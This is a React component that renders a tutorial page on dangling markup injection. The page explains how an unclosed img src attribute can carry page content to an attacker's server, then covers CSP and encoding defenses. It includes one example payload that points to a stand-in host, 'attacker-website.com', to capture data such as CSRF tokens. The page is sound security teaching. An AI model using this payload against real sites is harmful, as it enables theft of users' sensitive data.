import './XSSMaterial.css';
export default function DanglingMarkupInjection(){
    return(
        <div id="xss">
        <main className="mainbar">
            <section>
                <h1>Dangling markup injection</h1>
                <p>In this section, we'll explain dangling markup injection, how a typical exploit works, and how to prevent dangling markup attacks.</p>
                <h1>What is dangling markup injection?</h1>
                <p>Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.</p>
                <p>Suppose an application embeds attacker-controllable data into its responses in an unsafe way:</p>
                <div className="code">
                    <p>&lt;input type="text" name="input" value="CONTROLLABLE DATA HERE"/&gt;</p>
                </div>
                <p>Suppose also that the application does not filter or escape the &gt; or " characters. An attacker can use the following syntax to break out of the quoted attribute value and the enclosing tag, and return to an HTML context:</p>
                <div className="code">
                    <p>"&gt;</p>
                </div>
                <p>In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:</p>
                <div className="code">
                    <p>"&gt;&lt;img src='//attacker-website.com?'/&gt;</p>
                </div>
                <p>This payload creates an img tag and defines the start of a src attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the src attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.</p>
                <p>The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.</p>
                <p>Any attribute that makes an external request can be used for dangling markup.</p>
                <p>This next lab is difficult to solve because all external requests are blocked. However, there are certain tags that allow you to store data and retrieve it from an external server later. Solving this lab might require user interaction.</p>
            </section>
            <section>
                <h1>How to prevent dangling markup attacks</h1>
                <p>You can prevent dangling markup attacks using the same general defenses for preventing cross-site scripting, by encoding data on output and validating input on arrival.</p>
                <p>You can also mitigate some dangling markup attacks using content security policy (CSP). For example, you can prevent some (but not all) attacks, using a policy that prevent tags like img from loading external resources.</p>
                <div className="labbox">
                    <h1>Note</h1>
                    <p>The Chrome browser has decided to tackle dangling markup attacks by preventing tags like img from defining URLs containing raw characters such as angle brackets and newlines. This will prevent attacks since the data that would otherwise be captured will generally contain those raw characters, so the attack is blocked.</p>
                </div>
            </section>
        </main>
    </div>
    );
}